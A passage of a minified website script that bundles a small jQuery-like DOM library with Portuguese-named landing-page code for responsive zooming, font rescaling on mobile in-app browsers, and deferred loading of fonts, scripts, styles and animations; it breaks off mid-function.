! function() {
    "use strict";
    var e = {
        class: "className",
        contenteditable: "contentEditable",
        for: "htmlFor",
        readonly: "readOnly",
        maxlength: "maxLength",
        tabindex: "tabIndex",
        colspan: "colSpan",
        rowspan: "rowSpan",
        usemap: "useMap"
    };

    function aa(a, b) {
        try {
            return a(b)
        } catch (c) {
            return b
        }
    }
    var k = document,
        m = window,
        ba = k.documentElement,
        n = k.createElement.bind(k),
        ca = n("div"),
        p = n("table"),
        da = n("tbody"),
        ea = n("tr"),
        q = Array.isArray,
        r = Array.prototype,
        fa = r.concat,
        t = r.filter,
        ha = r.indexOf,
        ia = r.map,
        ja = r.push,
        ka = r.slice,
        u = r.some,
        la = r.splice,
        ma = /^#(?:[\w-]|\\.|[^\x00-\xa0])*$/,
        na = /^\.(?:[\w-]|\\.|[^\x00-\xa0])*$/,
        oa = /<.+>/,
        pa = /^\w+$/;

    function v(a, b) {
        return a && (w(b) || x(b)) ? na.test(a) ? b.getElementsByClassName(a.slice(1)) : pa.test(a) ? b.getElementsByTagName(a) : b.querySelectorAll(a) : []
    }
    var B = function() {
            function a(a, c) {
                if (a) {
                    if (a instanceof B) return a;
                    var b = a;
                    if (C(a)) {
                        if (b = (c instanceof B ? c[0] : c) || k, !(b = ma.test(a) ? b.getElementById(a.slice(1)) : oa.test(a) ? qa(a) : v(a, b))) return
                    } else if (D(a)) return this.ready(a);
                    for ((b.nodeType || b === m) && (b = [b]), this.length = b.length, a = 0, c = this.length; a < c; a++) this[a] = b[a]
                }
            }
            return a.prototype.init = function(b, c) {
                return new a(b, c)
            }, a
        }(),
        E = B.prototype,
        F = E.init;
    F.fn = F.prototype = E, E.length = 0, E.splice = la, "function" == typeof Symbol && (E[Symbol.iterator] = r[Symbol.iterator]), E.map = function(a) {
        return F(fa.apply([], ia.call(this, (function(b, c) {
            return a.call(b, c, b)
        }))))
    }, E.slice = function(a, b) {
        return F(ka.call(this, a, b))
    };
    var ra = /-([a-z])/g;

    function G(a) {
        return a.replace(ra, (function(a, c) {
            return c.toUpperCase()
        }))
    }

    function sa(a, b) {
        var c = a && (a.matches || a.webkitMatchesSelector || a.msMatchesSelector);
        return !!c && !!b && c.call(a, b)
    }

    function H(a) {
        return !!a && a === a.window
    }

    function w(a) {
        return !!a && 9 === a.nodeType
    }

    function x(a) {
        return !!a && 1 === a.nodeType
    }

    function D(a) {
        return "function" == typeof a
    }

    function C(a) {
        return "string" == typeof a
    }

    function ta(a) {
        return !isNaN(parseFloat(a)) && isFinite(a)
    }

    function I(a) {
        return "object" == typeof a && null !== a && (null === (a = Object.getPrototypeOf(a)) || a === Object.prototype)
    }

    function J(a, b, c) {
        if (c)
            for (c = a.length; c-- && !1 !== b.call(a[c], c, a[c]););
        else if (I(a)) {
            var d = Object.keys(a);
            c = 0;
            for (var h = d.length; c < h; c++) {
                var f = d[c];
                if (!1 === b.call(a[f], f, a[f])) break
            }
        } else
            for (c = 0, h = a.length; c < h && !1 !== b.call(a[c], c, a[c]); c++);
        return a
    }

    function K() {
        for (var a = [], b = 0; b < arguments.length; b++) a[b] = arguments[b];
        b = "boolean" == typeof a[0] && a.shift();
        var c = a.shift(),
            d = a.length;
        if (!c) return {};
        if (!d) return K(b, F, c);
        for (var h = 0; h < d; h++) {
            var g, f = a[h];
            for (g in f) b && (q(f[g]) || I(f[g])) ? (c[g] && c[g].constructor === f[g].constructor || (c[g] = new f[g].constructor), K(b, c[g], f[g])) : c[g] = f[g]
        }
        return c
    }

    function L(a) {
        return C(a) ? function(b, c) {
            return sa(c, a)
        } : D(a) ? a : a instanceof B ? function(b, c) {
            return a.is(c)
        } : a ? function(b, c) {
            return c === a
        } : function() {
            return !1
        }
    }

    function M(a, b) {
        return b ? a.filter(b) : a
    }
    F.guid = 1, F.isWindow = H, F.isFunction = D, F.isArray = q, F.isNumeric = ta, F.isPlainObject = I, E.get = function(a) {
        return void 0 === a ? ka.call(this) : this[0 > (a = Number(a)) ? a + this.length : a]
    }, E.eq = function(a) {
        return F(this.get(a))
    }, E.first = function() {
        return this.eq(0)
    }, E.last = function() {
        return this.eq(-1)
    }, F.each = J, E.each = function(a) {
        return J(this, a)
    }, E.prop = function(a, b) {
        if (a) {
            if (C(a)) return a = e[a] || a, 2 > arguments.length ? this[0] && this[0][a] : this.each((function(c, h) {
                h[a] = b
            }));
            for (var c in a) this.prop(c, a[c]);
            return this
        }
    }, E.removeProp = function(a) {
        return this.each((function(b, c) {
            delete c[e[a] || a]
        }))
    }, F.extend = K, E.extend = function(a) {
        return K(E, a)
    }, E.filter = function(a) {
        var b = L(a);
        return F(t.call(this, (function(a, d) {
            return b.call(a, d, a)
        })))
    };
    var ua = /\S+/g;

    function N(a) {
        return C(a) && a.match(ua) || []
    }

    function O(a, b, c, d) {
        for (var h = [], f = D(b), g = d && L(d), y = 0, z = a.length; y < z; y++)
            if (f) {
                var l = b(a[y]);
                l.length && ja.apply(h, l)
            } else
                for (l = a[y][b]; !(null == l || d && g(-1, l));) h.push(l), l = c ? l[b] : null;
        return h
    }

    function P(a) {
        return 1 < a.length ? t.call(a, (function(a, c, d) {
            return ha.call(d, a) === c
        })) : a
    }

    function Q(a, b, c) {
        if (x(a)) {
            var d = m.getComputedStyle(a, null);
            return c ? d.getPropertyValue(b) || void 0 : d[b] || a.style[b]
        }
    }

    function R(a, b) {
        return parseInt(Q(a, b), 10) || 0
    }
    E.hasClass = function(a) {
        return !!a && u.call(this, (function(b) {
            return x(b) && b.classList.contains(a)
        }))
    }, E.removeAttr = function(a) {
        var b = N(a);
        return this.each((function(a, d) {
            x(d) && J(b, (function(a, b) {
                d.removeAttribute(b)
            }))
        }))
    }, E.attr = function(a, b) {
        if (a) {
            if (C(a)) {
                if (2 > arguments.length) {
                    if (!this[0] || !x(this[0])) return;
                    var c = this[0].getAttribute(a);
                    return null === c ? void 0 : c
                }
                return void 0 === b ? this : null === b ? this.removeAttr(a) : this.each((function(c, h) {
                    x(h) && h.setAttribute(a, b)
                }))
            }
            for (c in a) this.attr(c, a[c]);
            return this
        }
    }, E.toggleClass = function(a, b) {
        var c = N(a),
            d = void 0 !== b;
        return this.each((function(a, f) {
            x(f) && J(c, (function(a, c) {
                d ? b ? f.classList.add(c) : f.classList.remove(c) : f.classList.toggle(c)
            }))
        }))
    }, E.addClass = function(a) {
        return this.toggleClass(a, !0)
    }, E.removeClass = function(a) {
        return arguments.length ? this.toggleClass(a, !1) : this.attr("class", "")
    }, F.unique = P, E.add = function(a, b) {
        return F(P(this.get().concat(F(a, b).get())))
    };
    var S = /^--/,
        T = {},
        va = ca.style,
        wa = ["webkit", "moz", "ms"];
    var ya = {
        animationIterationCount: !0,
        columnCount: !0,
        flexGrow: !0,
        flexShrink: !0,
        fontWeight: !0,
        gridArea: !0,
        gridColumn: !0,
        gridColumnEnd: !0,
        gridColumnStart: !0,
        gridRow: !0,
        gridRowEnd: !0,
        gridRowStart: !0,
        lineHeight: !0,
        opacity: !0,
        order: !0,
        orphans: !0,
        widows: !0,
        zIndex: !0
    };

    function za(a, b, c) {
        return void 0 === c && (c = S.test(a)), c || ya[a] || !ta(b) ? b : b + "px"
    }
    E.css = function(a, b) {
        if (C(a)) {
            var c = S.test(a);
            return a = function xa(a, b) {
                if (void 0 === b && (b = S.test(a)), b) return a;
                if (!T[a]) {
                    var c = "" + (b = G(a))[0].toUpperCase() + b.slice(1);
                    J(b = (b + " " + wa.join(c + " ") + c).split(" "), (function(b, c) {
                        if (c in va) return T[a] = c, !1
                    }))
                }
                return T[a]
            }(a, c), 2 > arguments.length ? this[0] && Q(this[0], a, c) : a ? (b = za(a, b, c), this.each((function(d, f) {
                x(f) && (c ? f.style.setProperty(a, b) : f.style[a] = b)
            }))) : this
        }
        for (var d in a) this.css(d, a[d]);
        return this
    };
    var Aa = /^\s+|\s+$/;

    function Ba(a, b) {
        return a = a.dataset[b] || a.dataset[G(b)], Aa.test(a) ? a : aa(JSON.parse, a)
    }

    function Ca(a, b) {
        var c = a.documentElement;
        return Math.max(a.body["scroll" + b], c["scroll" + b], a.body["offset" + b], c["offset" + b], c["client" + b])
    }

    function Da(a, b) {
        return R(a, "border" + (b ? "Left" : "Top") + "Width") + R(a, "padding" + (b ? "Left" : "Top")) + R(a, "padding" + (b ? "Right" : "Bottom")) + R(a, "border" + (b ? "Right" : "Bottom") + "Width")
    }
    E.data = function(a, b) {
        if (!a) {
            if (!this[0]) return;
            var d, c = {};
            for (d in this[0].dataset) c[d] = Ba(this[0], d);
            return c
        }
        if (C(a)) return 2 > arguments.length ? this[0] && Ba(this[0], a) : void 0 === b ? this : this.each((function(c, d) {
            c = b, c = aa(JSON.stringify, c), d.dataset[G(a)] = c
        }));
        for (d in a) this.data(d, a[d]);
        return this
    }, J([!0, !1], (function(a, b) {
        J(["Width", "Height"], (function(a, d) {
            E[(b ? "outer" : "inner") + d] = function(c) {
                if (this[0]) return H(this[0]) ? b ? this[0]["inner" + d] : this[0].document.documentElement["client" + d] : w(this[0]) ? Ca(this[0], d) : this[0][(b ? "offset" : "client") + d] + (c && b ? R(this[0], "margin" + (a ? "Top" : "Left")) + R(this[0], "margin" + (a ? "Bottom" : "Right")) : 0)
            }
        }))
    })), J(["Width", "Height"], (function(a, b) {
        var c = b.toLowerCase();
        E[c] = function(d) {
            if (!this[0]) return void 0 === d ? void 0 : this;
            if (!arguments.length) return H(this[0]) ? this[0].document.documentElement["client" + b] : w(this[0]) ? Ca(this[0], b) : this[0].getBoundingClientRect()[c] - Da(this[0], !a);
            var h = parseInt(d, 10);
            return this.each((function(b, d) {
                x(d) && (b = Q(d, "boxSizing"), d.style[c] = za(c, h + ("border-box" === b ? Da(d, !a) : 0)))
            }))
        }
    }));
    var U = {};

    function Ea(a, b) {
        return !b || !u.call(b, (function(b) {
            return 0 > a.indexOf(b)
        }))
    }
    E.toggle = function(a) {
        return this.each((function(b, c) {
            if (x(c))
                if (void 0 === a ? "none" === Q(c, "display") : a) {
                    if (c.style.display = c.___cd || "", "none" === Q(c, "display")) {
                        if (b = c.style, c = c.tagName, U[c]) c = U[c];
                        else {
                            var d = n(c);
                            k.body.insertBefore(d, null);
                            var h = Q(d, "display");
                            k.body.removeChild(d), c = U[c] = "none" !== h ? h : "block"
                        }
                        b.display = c
                    }
                } else c.___cd = Q(c, "display"), c.style.display = "none"
        }))
    }, E.hide = function() {
        return this.toggle(!1)
    }, E.show = function() {
        return this.toggle(!0)
    };
    var V = {
            focus: "focusin",
            blur: "focusout"
        },
        W = {
            mouseenter: "mouseover",
            mouseleave: "mouseout"
        },
        Fa = /^(mouse|pointer|contextmenu|drag|drop|click|dblclick)/i;

    function X(a) {
        return [(a = a.split("."))[0], a.slice(1).sort()]
    }

    function Y(a, b, c, d, h) {
        var f = a.___ce = a.___ce || {};
        if (b) f[b] && (f[b] = f[b].filter((function(f) {
            var g = f[0],
                z = f[1];
            if (f = f[2], h && f.guid !== h.guid || !Ea(g, c) || d && d !== z) return !0;
            a.removeEventListener(b, f)
        })));
        else
            for (b in f) Y(a, b, c, d, h)
    }

    function Ha(a) {
        return a.multiple && a.options ? O(t.call(a.options, (function(a) {
            return a.selected && !a.disabled && !a.parentNode.disabled
        })), "value") : a.value || ""
    }
    E.off = function(a, b, c) {
        var d = this;
        if (void 0 === a) this.each((function(a, b) {
            (x(b) || w(b) || H(b)) && Y(b)
        }));
        else if (C(a)) D(b) && (c = b, b = ""), J(N(a), (function(a, h) {
            h = (a = X(h))[0];
            var f = a[1],
                g = W[h] || V[h] || h;
            d.each((function(a, d) {
                (x(d) || w(d) || H(d)) && Y(d, g, f, b, c)
            }))
        }));
        else
            for (var h in a) this.off(h, a[h]);
        return this
    }, E.on = function(a, b, c, d, h) {
        var f = this;
        if (!C(a)) {
            for (var g in a) this.on(g, b, c, a[g], h);
            return this
        }
        return C(b) || (null != b && (void 0 !== c && (d = c), c = b), b = ""), D(d) || (d = c, c = void 0), d ? (J(N(a), (function(a, g) {
            g = (a = X(g))[0];
            var l = a[1],
                z = W[g] || V[g] || g,
                y = g in W,
                Ka = g in V;
            z && f.each((function(a, f) {
                (x(f) || w(f) || H(f)) && (a = function La(a) {
                    if (a.target["___i" + a.type]) return a.stopImmediatePropagation();
                    if ((!a.namespace || Ea(l, a.namespace.split("."))) && (b || !(Ka && (a.target !== f || a.___ot === z) || y && a.relatedTarget && f.contains(a.relatedTarget)))) {
                        var g = f;
                        if (b) {
                            for (var A = a.target; !sa(A, b);) {
                                if (A === f) return;
                                if (!(A = A.parentNode)) return
                            }
                            g = A, a.___cd = !0
                        }
                        a.___cd && Object.defineProperty(a, "currentTarget", {
                            configurable: !0,
                            get: function() {
                                return g
                            }
                        }), Object.defineProperty(a, "data", {
                            configurable: !0,
                            get: function() {
                                return c
                            }
                        }), A = d.call(g, a, a.___td), h && Y(f, z, l, b, La), !1 === A && (a.preventDefault(), a.stopPropagation())
                    }
                }, a.guid = d.guid = d.guid || F.guid++, function Ga(a, b, c, d, h) {
                    var f = a.___ce = a.___ce || {};
                    f[b] = f[b] || [], f[b].push([c, d, h]), a.addEventListener(b, h)
                }(f, z, l, b, a))
            }))
        })), this) : this
    }, E.one = function(a, b, c, d) {
        return this.on(a, b, c, d, !0)
    }, E.ready = function(a) {
        function b() {
            return setTimeout(a, 0, F)
        }
        return "loading" !== k.readyState ? b() : k.addEventListener("DOMContentLoaded", b), this
    }, E.trigger = function(a, b) {
        if (C(a)) {
            var c = X(a),
                d = c[0];
            c = c[1];
            var h = W[d] || V[d] || d;
            if (!h) return this;
            var f = Fa.test(h) ? "MouseEvents" : "HTMLEvents";
            (a = k.createEvent(f)).initEvent(h, !0, !0), a.namespace = c.join("."), a.___ot = d
        }
        a.___td = b;
        var g = a.___ot in V;
        return this.each((function(b, c) {
            g && D(c[a.___ot]) && (c["___i" + a.type] = !0, c[a.___ot](), c["___i" + a.type] = !1), c.dispatchEvent(a)
        }))
    };
    var Ia = /%20/g,
        Ja = /\r?\n/g,
        Ma = /file|reset|submit|button|image/i,
        Na = /radio|checkbox/i;
    E.serialize = function() {
        var a = "";
        return this.each((function(b, c) {
            J(c.elements || [c], (function(b, c) {
                c.disabled || !c.name || "FIELDSET" === c.tagName || Ma.test(c.type) || Na.test(c.type) && !c.checked || void 0 !== (b = Ha(c)) && J(b = q(b) ? b : [b], (function(b, d) {
                    b = a, d = "&" + encodeURIComponent(c.name) + "=" + encodeURIComponent(d.replace(Ja, "\r\n")).replace(Ia, "+"), a = b + d
                }))
            }))
        })), a.slice(1)
    }, E.val = function(a) {
        return arguments.length ? this.each((function(b, c) {
            if ((b = c.multiple && c.options) || Na.test(c.type)) {
                var d = q(a) ? ia.call(a, String) : null === a ? [] : [String(a)];
                b ? J(c.options, (function(a, b) {
                    b.selected = 0 <= d.indexOf(b.value)
                }), !0) : c.checked = 0 <= d.indexOf(c.value)
            } else c.value = null == a ? "" : a
        })) : this[0] && Ha(this[0])
    }, E.clone = function() {
        return this.map((function(a, b) {
            return b.cloneNode(!0)
        }))
    }, E.detach = function(a) {
        return M(this, a).each((function(a, c) {
            c.parentNode && c.parentNode.removeChild(c)
        })), this
    };
    var Oa = /^\s*<(\w+)[^>]*>/,
        Pa = /^<(\w+)\s*\/?>(?:<\/\1>)?$/,
        Qa = {
            "*": ca,
            tr: da,
            td: ea,
            th: ea,
            thead: p,
            tbody: p,
            tfoot: p
        };

    function qa(a) {
        if (!C(a)) return [];
        if (Pa.test(a)) return [n(RegExp.$1)];
        var b = Oa.test(a) && RegExp.$1;
        return (b = Qa[b] || Qa["*"]).innerHTML = a, F(b.childNodes).detach().get()
    }
    F.parseHTML = qa, E.empty = function() {
        return this.each((function(a, b) {
            for (; b.firstChild;) b.removeChild(b.firstChild)
        }))
    }, E.html = function(a) {
        return arguments.length ? void 0 === a ? this : this.each((function(b, c) {
            x(c) && (c.innerHTML = a)
        })) : this[0] && this[0].innerHTML
    }, E.remove = function(a) {
        return M(this, a).detach().off(), this
    }, E.text = function(a) {
        return void 0 === a ? this[0] ? this[0].textContent : "" : this.each((function(b, c) {
            x(c) && (c.textContent = a)
        }))
    }, E.unwrap = function() {
        return this.parent().each((function(a, b) {
            "BODY" !== b.tagName && (a = F(b)).replaceWith(a.children())
        })), this
    }, E.offset = function() {
        var a = this[0];
        if (a) return {
            top: (a = a.getBoundingClientRect()).top + m.pageYOffset,
            left: a.left + m.pageXOffset
        }
    }, E.offsetParent = function() {
        return this.map((function(a, b) {
            for (a = b.offsetParent; a && "static" === Q(a, "position");) a = a.offsetParent;
            return a || ba
        }))
    }, E.position = function() {
        var a = this[0];
        if (a) {
            var b = "fixed" === Q(a, "position"),
                c = b ? a.getBoundingClientRect() : this.offset();
            if (!b) {
                var d = a.ownerDocument;
                for (b = a.offsetParent || d.documentElement;
                    (b === d.body || b === d.documentElement) && "static" === Q(b, "position");) b = b.parentNode;
                b !== a && x(b) && (d = F(b).offset(), c.top -= d.top + R(b, "borderTopWidth"), c.left -= d.left + R(b, "borderLeftWidth"))
            }
            return {
                top: c.top - R(a, "marginTop"),
                left: c.left - R(a, "marginLeft")
            }
        }
    }, E.children = function(a) {
        return M(F(P(O(this, (function(a) {
            return a.children
        })))), a)
    }, E.contents = function() {
        return F(P(O(this, (function(a) {
            return "IFRAME" === a.tagName ? [a.contentDocument] : "TEMPLATE" === a.tagName ? a.content.childNodes : a.childNodes
        }))))
    }, E.find = function(a) {
        return F(P(O(this, (function(b) {
            return v(a, b)
        }))))
    };
    var Ra = /^\s*<!(?:\[CDATA\[|--)|(?:\]\]|--)>\s*$/g,
        Sa = /^$|^module$|\/(java|ecma)script/i,
        Ta = ["type", "src", "nonce", "noModule"];

    function Z(a, b, c, d, h, f, g, y) {
        return J(a, (function(a, f) {
            J(F(f), (function(a, f) {
                J(F(b), (function(b, g) {
                    var l = c ? g : f;
                    g = c ? f : g, l = (b = c ? a : b) ? l.cloneNode(!0) : l, b = !b, h ? g.insertBefore(l, d ? g.firstChild : null) : g.parentNode.insertBefore(l, d ? g : g.nextSibling), b && function Ua(a, b) {
                        (a = F(a)).filter("script").add(a.find("script")).each((function(a, d) {
                            if (Sa.test(d.type) && ba.contains(d)) {
                                var c = n("script");
                                c.text = d.textContent.replace(Ra, ""), J(Ta, (function(a, b) {
                                    d[b] && (c[b] = d[b])
                                })), b.head.insertBefore(c, null), b.head.removeChild(c)
                            }
                        }))
                    }(l, g.ownerDocument)
                }), y)
            }), g)
        }), f), b
    }
    E.after = function() {
        return Z(arguments, this, !1, !1, !1, !0, !0)
    }, E.append = function() {
        return Z(arguments, this, !1, !1, !0)
    }, E.appendTo = function(a) {
        return Z(arguments, this, !0, !1, !0)
    }, E.before = function() {
        return Z(arguments, this, !1, !0)
    }, E.insertAfter = function(a) {
        return Z(arguments, this, !0, !1, !1, !1, !1, !0)
    }, E.insertBefore = function(a) {
        return Z(arguments, this, !0, !0)
    }, E.prepend = function() {
        return Z(arguments, this, !1, !0, !0, !0, !0)
    }, E.prependTo = function(a) {
        return Z(arguments, this, !0, !0, !0, !1, !1, !0)
    }, E.replaceWith = function(a) {
        return this.before(a).remove()
    }, E.replaceAll = function(a) {
        return F(a).replaceWith(this), this
    }, E.wrapAll = function(a) {
        for (var b = (a = F(a))[0]; b.children.length;) b = b.firstElementChild;
        return this.first().before(a), this.appendTo(b)
    }, E.wrap = function(a) {
        return this.each((function(b, c) {
            var d = F(a)[0];
            F(c).wrapAll(b ? d.cloneNode(!0) : d)
        }))
    }, E.wrapInner = function(a) {
        return this.each((function(b, c) {
            (c = (b = F(c)).contents()).length ? c.wrapAll(a) : b.append(a)
        }))
    }, E.has = function(a) {
        var b = C(a) ? function(b, d) {
            return v(a, d).length
        } : function(b, d) {
            return d.contains(a)
        };
        return this.filter(b)
    }, E.is = function(a) {
        var b = L(a);
        return u.call(this, (function(a, d) {
            return b.call(a, d, a)
        }))
    }, E.next = function(a, b, c) {
        return M(F(P(O(this, "nextElementSibling", b, c))), a)
    }, E.nextAll = function(a) {
        return this.next(a, !0)
    }, E.nextUntil = function(a, b) {
        return this.next(b, !0, a)
    }, E.not = function(a) {
        var b = L(a);
        return this.filter((function(c, d) {
            return (!C(a) || x(d)) && !b.call(d, c, d)
        }))
    }, E.parent = function(a) {
        return M(F(P(O(this, "parentNode"))), a)
    }, E.index = function(a) {
        var b = a ? F(a)[0] : this[0];
        return a = a ? this : F(b).parent().children(), ha.call(a, b)
    }, E.closest = function(a) {
        var b = this.filter(a);
        if (b.length) return b;
        var c = this.parent();
        return c.length ? c.closest(a) : b
    }, E.parents = function(a, b) {
        return M(F(P(O(this, "parentElement", !0, b))), a)
    }, E.parentsUntil = function(a, b) {
        return this.parents(b, a)
    }, E.prev = function(a, b, c) {
        return M(F(P(O(this, "previousElementSibling", b, c))), a)
    }, E.prevAll = function(a) {
        return this.prev(a, !0)
    }, E.prevUntil = function(a, b) {
        return this.prev(b, !0, a)
    }, E.siblings = function(a) {
        return M(F(P(O(this, (function(a) {
            return F(a).parent().children().not(a)
        })))), a)
    }, "undefined" != typeof exports ? module.exports = F : m.cash = m.$ = F
}();
var largura_tela, altura_tela, timeout_resize, elementos_css = {},
    blocos_posicao = {},
    elementos_posicao = {},
    elementos_popup = {},
    elementos_botoes_evento = {},
    pagina_controle = {
        classe_bloco: "gpc-b",
        classe_elemento: "gpc-e",
        classe_elemento_antigo: "gpc-elemento",
        classe_elemento_interno: "c",
        classe_elemento_interno_antigo: "conteudo",
        elementos_timer: {}
    };

function GreatResize() {
    let tamanho_tela = $(window).width();

    function iOS() {
        return ["iPad Simulator", "iPhone Simulator", "iPod Simulator", "iPad", "iPhone", "iPod"].includes(navigator.platform) || navigator.userAgent.includes("Mac") && "ontouchend" in document
    }
    if (tamanho_tela <= 1200) {
        let controle = 1200;
        if (tamanho_tela > 360 && tamanho_tela <= 800) return $(".gpc-b").each((function() {
            "fixed" == $(this).css("background-attachment") && $(this).css("background-position", "")
        })), void(iOS() ? $('meta[name="viewport"]').attr("content", "width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, shrink-to-fit=no") : $("body").css("zoom", ""));
        tamanho_tela <= 360 && (controle = 360);
        let novo_tamanho, proporcao = (100 * tamanho_tela / controle).toFixed(5);
        novo_tamanho = tamanho_tela - tamanho_tela * (proporcao / 100), 0 != novo_tamanho ? ($(".gpc-b").each((function(i, bloco) {
            "fixed" == $(bloco).css("background-attachment") && (iOS() && $(bloco).css("background-attachment", "initial"), $(bloco).position().top >= $(window).height() ? $(bloco).css("background-position", $(bloco).css("background-position-x") + " 100%") : $(bloco).css("background-position", $(bloco).css("background-position-x") + " 0%"))
        })), iOS() ? $('meta[name="viewport"]').attr("content", "width=" + novo_tamanho + ", initial-scale=" + proporcao / 100 + ", maximum-scale=" + proporcao / 100 + ", minimum-scale=" + proporcao / 100 + ", user-scalable=no, shrink-to-fit=no") : $("body").css({
            zoom: proporcao + "%"
        })) : iOS() && $(".gpc-b").each((function(i, bloco) {
            "fixed" == $(bloco).css("background-attachment") && ($(bloco).css("background-attachment", "initial"), $(bloco).position().top >= $(window).height() ? $(bloco).css("background-position", $(bloco).css("background-position-x") + " 100%") : $(bloco).css("background-position", $(bloco).css("background-position-x") + " 0%"))
        }))
    } else $(".gpc-b").each((function(i, bloco) {
        "fixed" == $(bloco).css("background-attachment") && $(bloco).css("background-position", "")
    })), iOS() ? $('meta[name="viewport"]').attr("content", "width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, shrink-to-fit=no") : $("body").css("zoom", "")
}

function GreatFontes(modal) {
    null == modal && (modal = !1), (navigator.userAgent.match(/Android/i) && (navigator.userAgent.match(/Instagram/i) || navigator.userAgent.match(/FBAN/i) || navigator.userAgent.match(/FBAV/i)) || navigator.userAgent.match(/iPhone/i) && $(window).width() < 360) && $((modal ? ".gm " : "") + ".gpc-e").each((function() {
        var elemento = $(this),
            elemento_id = elemento.attr("id");
        if (elementos_css.hasOwnProperty(elemento_id)) {
            var elemento_conteudo = elemento.hasClass("e_formulario") ? elemento.find(".gpc_botao") : elemento.children(".c"),
                fs_aumento = fs_novo = 0;
            if (parseFloat(elemento_conteudo.css("font-size")) != elementos_css[elemento_id].fs)
                if (fs_aumento = 100 * elementos_css[elemento_id].fs / parseFloat(elemento_conteudo.css("font-size")), fs_novo = elementos_css[elemento_id].fs - (100 - fs_aumento) * (elementos_css[elemento_id].fs / 100), elemento_conteudo.css("font-size", fs_novo + "px"), elemento_conteudo.children().each((function() {
                        $(this).css("font-size", fs_novo + "px")
                    })), elementos_css[elemento_id].lh && (elemento_conteudo.css("line-height", elementos_css[elemento_id].lh), elemento_conteudo.children().each((function() {
                        $(this).css("line-height", elementos_css[elemento_id].lh)
                    }))), elemento.hasClass("e_timer")) parseFloat(elemento_conteudo.css("font-size")) != elementos_css[elemento_id].fs && (elemento_conteudo.find(".contador_titulos").css("line-height", "1"), elemento_conteudo.find(".contador_itens").children("span").css("line-height", "1.2"));
                else if (elemento.hasClass("e_formulario")) {
                var fs_aumento_form = fs_novo_form = 0;
                fs_aumento_form = 1400 / parseFloat(elemento_conteudo.find(".gpc_campos-titulo").css("font-size")), fs_novo_form = 14 - .14 * (100 - fs_aumento_form), elemento_conteudo.find(".gpc_campos-titulo").css({
                    "font-size": fs_novo_form + "px",
                    "line-height": "1.4"
                }), fs_aumento_form = 1200 / parseFloat(elemento_conteudo.find(".gpc_campos-texto").css("font-size")), fs_novo_form = 12 - .12 * (100 - fs_aumento_form), elemento_conteudo.find(".gpc_campos-texto").css({
                    "font-size": fs_novo_form + "px",
                    "line-height": "1.4"
                }), elemento_conteudo.find(".gpc_botao").css({
                    "font-size": fs_novo + "px",
                    "line-height": elementos_css[elemento_id].lh
                })
            }
        }
    }))
}
GreatResize(), $((function() {
    GreatResize()
})), window.addEventListener("resize", (function(e) {
    e.preventDefault(), e.stopPropagation(), timeout_resize && (clearTimeout(timeout_resize), timeout_resize = null), largura_tela = $(window).width(), altura_tela = $(window).height(), timeout_resize = setTimeout((function() {
        $(window).width() == largura_tela && $(window).height() == altura_tela && GreatResize()
    }), 50)
}), {
    passive: !0
}), $((function() {
    GreatFontes()
})), $((function() {
    GreatLoader("iniciar")
}));
var gle_fontes = {},
    gle_css = {},
    gle_scripts = {};

function GreatLoader(acao) {
    gle_fontes.elementos = $(".gle_fontes"), gle_fontes.encontrados = gle_fontes.elementos.length, gle_fontes.carregados = 0, 0 != gle_fontes.encontrados ? window.getCrawler() ? CarregarFontes() : (InserirFontes(acao), setTimeout((function() {
        CarregarFontes()
    }), 4500)) : CarregarFontes(), setTimeout((function() {
        gle_scripts.elementos = $(".gle_scripts"), gle_scripts.encontrados = gle_scripts.elementos.length, gle_scripts.carregados = 0, 0 != gle_scripts.encontrados ? InserirScripts(acao) : "iniciar" == acao && null != window.InserirScriptsInline && InserirScriptsInline()
    }), 20), setTimeout((function() {
        gle_css = $(".gle_css"), InserirCss(acao)
    }), 30), setTimeout((function() {
        GObserver.instalar({
            elemento: ".e_animacoes",
            antecipacao: 0,
            executar: function(elemento) {
                ! function(elemento) {
                    var elemento_carregando = setInterval((function() {
                        if (!($(elemento).hasClass("se_imagem") || $(elemento).hasClass("se_video") || $(elemento).hasClass("se_caixa") || $(elemento).find(".c").hasClass("se_fonte") || $(elemento).hasClass("se_slider"))) {
                            clearInterval(elemento_carregando);
                            var elemento_id = $(elemento).attr("id").replace("_d", "").replace("_m", ""),
                                elemento_informacoes = $(elemento).hasClass("e_video") && $(elemento).find(".carregando").length ? $(elemento).find(".carregando") : $(elemento).find(".c"),
                                animacao_nome = $(elemento_informacoes).attr("data-animation-nome"),
                                animacao_duration = $(elemento_informacoes).attr("data-animation-duration") ? $(elemento_informacoes).attr("data-animation-duration") + "ms" : "1000ms",
                                animacao_delay = $(elemento_informacoes).attr("data-animation-delay") ? $(elemento_informacoes).attr("data-animation-delay") + "ms" : "0ms",
                                animacao_repeat = "loop" == $(elemento_informacoes).attr("data-animation-repeat") ? "infinite" : "";
                            if ("slide" == animacao_nome || "zoom" == animacao_nome || "flip" == animacao_nome) var animacao_tipo = "cubic-bezier(.25,.46,.45,.94)";
                            else if ("fade" == animacao_nome) animacao_tipo = "cubic-bezier(0.390, 0.575, 0.565, 1.000)";
                            else if ("roll" == animacao_nome) animacao_tipo = "ease-out";
                            else if ("fold" == animacao_nome) animacao_tipo = "cubic-bezier(.175,.885,.32,1.275)";
                            else animacao_tipo = "";
                            if ($(elemento).removeClass("e_animacoes"), !window.getCrawler())
                                if ($(elemento).hasClass("e_faq"))
                                    for (var itens = $(elemento).find(".gac-item"), i = 0; i < itens.length; i++) $(itens[i]).css({
                                        animation: elemento_id + "_animacao " + animacao_duration + " " + animacao_tipo + " " + (parseInt(animacao_delay) + 500 * i) + "ms " + animacao_repeat + " both",
                                        "-webkit-animation": elemento_id + "_animacao " + animacao_duration + " " + animacao_tipo + " " + (parseInt(animacao_delay) + 500 * i) + "ms " + animacao_repeat + " both",
                                        transform: "translate3d(0,0,0)",
                                        "-webkit-transform": "translate3d(0,0,0)",
                                        perspective: "500px"
                                    });
                                else $(elemento).find(".c").css({
                                    animation: elemento_id + "_animacao " + animacao_duration + " " + animacao_tipo + " " + animacao_delay + " " + animacao_repeat + " both",
                                    "-webkit-animation": elemento_id + "_animacao " + animacao_duration + " " + animacao_tipo + " " + animacao_delay + " " + animacao_repeat + " both",
                                    transform: "translate3d(0,0,0)",
                                    "-webkit-transform": "translate3d(0,0,0)",
                                    perspective: "500px"
                                });
                            $(elemento_informacoes).removeAttr("data-animation-nome data-animation-duration data-animation-delay data-animation-repeat")
                        }
                    }), 50)
                }(elemento)
            }
        })
    }), 30), setTimeout((function() {
        GObserver.instalar({
